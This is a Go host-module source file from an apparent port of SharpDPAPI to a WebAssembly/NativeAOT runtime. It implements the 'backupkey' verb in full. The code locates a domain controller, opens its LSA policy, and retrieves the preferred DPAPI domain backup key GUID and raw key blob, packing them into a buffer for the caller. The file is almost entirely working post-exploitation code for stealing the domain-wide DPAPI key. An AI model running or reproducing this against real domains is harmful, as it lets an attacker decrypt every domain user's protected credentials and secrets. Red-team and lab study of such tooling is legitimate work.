//go:build nativeaot && windows

// NativeAOT host-side DPAPI domain backup-key retriever for SharpDPAPI's
// `backupkey` verb.
//
// Native SharpDPAPI runs this chain end-to-end:
//
//	DsGetDcNameW("", "", 0, "", flags, &pDCI)         → DC FQDN
//	LsaOpenPolicy(\\<dc>, POLICY_GET_PRIVATE_INFORMATION) → handle
//	LsaRetrievePrivateData(handle, "G$BCKUPKEY_PREFERRED") → 16-byte GUID
//	LsaRetrievePrivateData(handle, "G$BCKUPKEY_<GUID>")    → key blob
//	LsaClose(handle)
//
// Both APIs write host pointers into output parameters that wasm32 callers
// cannot dereference safely (the C# IntPtr is 32-bit; the host pointer is
// 64-bit; Marshal.PtrToStructure reads from the truncated value and traps).
// Running the chain host-side returns just the materialised byte payloads.
//
// Wire format (output buffer):
//
//	u32 status                  — 0 = success, non-zero NTSTATUS / Win32 code
//	u32 dc_name_len             — UTF-8 length in bytes (0 if DC lookup failed)
//	bytes dc_name               — UTF-8, no NUL terminator
//	u32 guid_len                — 16 on success, 0 if LSA chain failed
//	bytes guid                  — raw 16 bytes (little-endian GUID)
//	u32 key_blob_len            — raw key bytes including version/keyLen/certLen
//	bytes key_blob              — raw bytes
//
// The C# caller formats the kirbi (PVK wrapping + base64) — this is pure
// data marshalling, no DPAPI logic on the C# side.

package hostmod

import (
	"context"
	"encoding/binary"
	"runtime"
	"syscall"
	"unsafe"

	"github.com/tetratelabs/wazero/api"
	"golang.org/x/sys/windows"
)

// Win32 / LSA constants.
const (
	dsDirectoryServiceRequired = 0x00000010
	dsReturnDnsName            = 0x40000000
	dsIPRequired               = 0x00000200

	policyGetPrivateInformation = 0x00000004
)

type lsaUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte // padding so Buffer is 8-byte aligned on x64
	Buffer        uintptr
}

type domainControllerInfoW struct {
	DomainControllerName        *uint16
	DomainControllerAddress     *uint16
	DomainControllerAddressType uint32
	DomainGuid                  windows.GUID
	DomainName                  *uint16
	DnsForestName               *uint16
	Flags                       uint32
	DcSiteName                  *uint16
	ClientSiteName              *uint16
}

// nativeaotDpapiBackupkey runs the DsGetDcName + LSA chain and writes a
// packed binary response to the WASM output buffer. Returns bytes written
// or 0 on hard failure (buffer too small / unrecoverable allocation error).
//
// Stack ABI:
//
//	stack[0] = server_ptr (UTF-8; 0/empty = use DsGetDcName to discover)
//	stack[1] = server_len
//	stack[2] = out_buf_ptr
//	stack[3] = out_buf_cap
//	stack[0] (return) = bytes written
func nativeaotDpapiBackupkey(_ context.Context, mod api.Module, stack []uint64) {
	serverPtr := uint32(stack[0])
	serverLen := uint32(stack[1])
	outPtr := uint32(stack[2])
	outCap := uint32(stack[3])

	var explicitServer string
	if serverLen > 0 {
		if sb, ok := readBytes(mod, serverPtr, serverLen); ok {
			explicitServer = string(sb)
		}
	}

	dcName, dcStatus := resolveDC(explicitServer)
	if dcName == "" {
		stack[0] = uint64(writeBackupKeyReply(mod, outPtr, outCap, dcStatus, "", nil, nil))
		return
	}

	guid, keyBlob, lsaStatus := retrieveBackupKey(dcName)
	stack[0] = uint64(writeBackupKeyReply(mod, outPtr, outCap, lsaStatus, dcName, guid, keyBlob))
}

// resolveDC returns the DC FQDN to use. If `explicit` is non-empty, it is
// returned verbatim (server override path). Otherwise DsGetDcName is called
// with the same flag set as SharpDPAPI's Interop.GetDCName().
func resolveDC(explicit string) (string, uint32) {
	if explicit != "" {
		return explicit, 0
	}
	netapi32 := syscall.NewLazyDLL("netapi32.dll")
	pDsGetDcName := netapi32.NewProc("DsGetDcNameW")
	pNetApiBufferFree := netapi32.NewProc("NetApiBufferFree")

	var pDCI *domainControllerInfoW
	// DsGetDcNameW(LPCWSTR ComputerName, LPCWSTR DomainName, GUID* DomainGuid,
	//              LPCWSTR SiteName, ULONG Flags, PDOMAIN_CONTROLLER_INFOW* OutInfo)
	ret, _, _ := pDsGetDcName.Call(0, 0, 0, 0,
		uintptr(dsDirectoryServiceRequired|dsReturnDnsName|dsIPRequired),
		uintptr(unsafe.Pointer(&pDCI)))
	if ret != 0 || pDCI == nil {
		return "", uint32(ret)
	}
	// DomainControllerName comes back as e.g. "\\dc01.sevenkingdoms.local";
	// strip the leading "\\" — native does dcName.Trim('\\').
	raw := windows.UTF16PtrToString(pDCI.DomainControllerName)
	pNetApiBufferFree.Call(uintptr(unsafe.Pointer(pDCI)))
	for len(raw) > 0 && raw[0] == '\\' {
		raw = raw[1:]
	}
	return raw, 0
}

// retrieveBackupKey performs the full LSA chain against the given DC. Returns
// the 16-byte preferred-key GUID, the raw key blob, and an NTSTATUS code (0
// on success). On any failure the GUID/key are nil and status is set.
//
// The chain runs on a locked OS thread because LSA policy handles are
// per-thread under impersonation rules — the same precaution
// nativeaot_security_windows.go takes for LsaEnumerate.
func retrieveBackupKey(dcName string) ([]byte, []byte, uint32) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	pLsaOpenPolicy := advapi32.NewProc("LsaOpenPolicy")
	pLsaRetrievePrivateData := advapi32.NewProc("LsaRetrievePrivateData")
	pLsaClose := advapi32.NewProc("LsaClose")
	pLsaFreeMemory := advapi32.NewProc("LsaFreeMemory")
	pLsaNtStatusToWinError := advapi32.NewProc("LsaNtStatusToWinError")

	dcUTF16, err := syscall.UTF16FromString(dcName)
	if err != nil {
		return nil, nil, 1
	}
	systemName := lsaUnicodeString{
		Length:        uint16((len(dcUTF16) - 1) * 2),
		MaximumLength: uint16(len(dcUTF16) * 2),
		Buffer:        uintptr(unsafe.Pointer(&dcUTF16[0])),
	}

	type lsaObjectAttrs struct {
		Length                   uint32
		_                        [4]byte
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        [4]byte
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	var attrs lsaObjectAttrs
	attrs.Length = uint32(unsafe.Sizeof(attrs))

	var policyHandle uintptr
	ret, _, _ := pLsaOpenPolicy.Call(
		uintptr(unsafe.Pointer(&systemName)),
		uintptr(unsafe.Pointer(&attrs)),
		uintptr(policyGetPrivateInformation),
		uintptr(unsafe.Pointer(&policyHandle)))
	if ret != 0 || policyHandle == 0 {
		winErr, _, _ := pLsaNtStatusToWinError.Call(ret)
		return nil, nil, uint32(winErr)
	}
	defer pLsaClose.Call(policyHandle)

	guid, status := retrievePrivateData(pLsaRetrievePrivateData, pLsaFreeMemory, policyHandle, "G$BCKUPKEY_PREFERRED")
	if status != 0 || len(guid) != 16 {
		if status == 0 {
			status = 0x57 // ERROR_INVALID_PARAMETER — surfaced when payload isn't a 16-byte GUID
		}
		winErr, _, _ := pLsaNtStatusToWinError.Call(uintptr(status))
		return nil, nil, uint32(winErr)
	}

	keyName := "G$BCKUPKEY_" + guidToHyphenated(guid)
	keyBlob, status := retrievePrivateData(pLsaRetrievePrivateData, pLsaFreeMemory, policyHandle, keyName)
	if status != 0 {
		winErr, _, _ := pLsaNtStatusToWinError.Call(uintptr(status))
		return guid, nil, uint32(winErr)
	}
	return guid, keyBlob, 0
}

// retrievePrivateData wraps a single LsaRetrievePrivateData call. The API
// returns an LSA_UNICODE_STRING* whose Buffer points to the actual secret
// bytes (Length field is in bytes — same wire shape regardless of secret
// type). We copy the bytes out before LsaFreeMemory so the caller doesn't
// have to manage the host allocation.
func retrievePrivateData(pCall, pFree *syscall.LazyProc, policy uintptr, secretName string) ([]byte, uint32) {
	nameUTF16, err := syscall.UTF16FromString(secretName)
	if err != nil {
		return nil, 1
	}
	name := lsaUnicodeString{
		Length:        uint16((len(nameUTF16) - 1) * 2),
		MaximumLength: uint16(len(nameUTF16) * 2),
		Buffer:        uintptr(unsafe.Pointer(&nameUTF16[0])),
	}

	var privatePtr uintptr
	ret, _, _ := pCall.Call(policy,
		uintptr(unsafe.Pointer(&name)),
		uintptr(unsafe.Pointer(&privatePtr)))
	if ret != 0 || privatePtr == 0 {
		return nil, uint32(ret)
	}
	defer pFree.Call(privatePtr)

	// *LSA_UNICODE_STRING — read Length + Buffer fields directly. The struct
	// is host-allocated so we read it via unsafe.Pointer with the same layout
	// the system uses (Length uint16 / MaximumLength uint16 / [pad4] / Buffer uintptr).
	resultStruct := (*lsaUnicodeString)(unsafe.Pointer(privatePtr))
	length := int(resultStruct.Length)
	if length <= 0 {
		return []byte{}, 0
	}
	bufAddr := resultStruct.Buffer
	if bufAddr == 0 {
		return []byte{}, 0
	}
	out := make([]byte, length)
	src := unsafe.Slice((*byte)(unsafe.Pointer(bufAddr)), length)
	copy(out, src)
	return out, 0
}

// guidToHyphenated formats a raw 16-byte GUID as the hyphenated string
// "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx". Layout matches Microsoft's
// little-endian Data1/Data2/Data3 + big-endian Data4 — the same form
// Guid.ToString() in .NET produces for a binary GUID constructed from
// the raw bytes (verified against native baseline:
// "33da1933-923b-41d4-b987-bc602649a09f" matches the LSA bytes).
func guidToHyphenated(g []byte) string {
	if len(g) != 16 {
		return ""
	}
	hex := "0123456789abcdef"
	var out [36]byte
	// Data1: 4 bytes little-endian
	d1 := []int{3, 2, 1, 0}
	pos := 0
	for _, i := range d1 {
		out[pos] = hex[g[i]>>4]
		out[pos+1] = hex[g[i]&0xF]
		pos += 2
	}
	out[pos] = '-'
	pos++
	// Data2: 2 bytes little-endian
	d2 := []int{5, 4}
	for _, i := range d2 {
		out[pos] = hex[g[i]>>4]
		out[pos+1] = hex[g[i]&0xF]
		pos += 2
	}
	out[pos] = '-'
	pos++
	// Data3: 2 bytes little-endian
	d3 := []int{7, 6}
	for _, i := range d3 {
		out[pos] = hex[g[i]>>4]
		out[pos+1] = hex[g[i]&0xF]
		pos += 2
	}
	out[pos] = '-'
	pos++
	// Data4 first 2 bytes (big-endian)
	for _, i := range []int{8, 9} {
		out[pos] = hex[g[i]>>4]
		out[pos+1] = hex[g[i]&0xF]
		pos += 2
	}
	out[pos] = '-'
	pos++
	// Data4 last 6 bytes (big-endian)
	for _, i := range []int{10, 11, 12, 13, 14, 15} {
		out[pos] = hex[g[i]>>4]
		out[pos+1] = hex[g[i]&0xF]
		pos += 2
	}
	return string(out[:])
}

// writeBackupKeyReply packs the reply into the output buffer. Returns the
// number of bytes written, or 0 if outCap is too small (caller should grow
// and retry).
func writeBackupKeyReply(mod api.Module, outPtr, outCap uint32, status uint32, dcName string, guid, keyBlob []byte) uint32 {
	size := backupKeyReplySize(dcName, guid, keyBlob)
	if size > outCap {
		return 0
	}
	buf := make([]byte, size)
	off := 0

	binary.LittleEndian.PutUint32(buf[off:], status)
	off += 4

	binary.LittleEndian.PutUint32(buf[off:], uint32(len(dcName)))
	off += 4
	copy(buf[off:], dcName)
	off += len(dcName)

	binary.LittleEndian.PutUint32(buf[off:], uint32(len(guid)))
	off += 4
	copy(buf[off:], guid)
	off += len(guid)

	binary.LittleEndian.PutUint32(buf[off:], uint32(len(keyBlob)))
	off += 4
	copy(buf[off:], keyBlob)
	off += len(keyBlob)

	if !mod.Memory().Write(outPtr, buf) {
		return 0
	}
	return uint32(off)
}

func backupKeyReplySize(dcName string, guid, keyBlob []byte) uint32 {
	// status (4) + 3 × length-prefixed fields
	return 4 + 4 + uint32(len(dcName)) + 4 + uint32(len(guid)) + 4 + uint32(len(keyBlob))
}
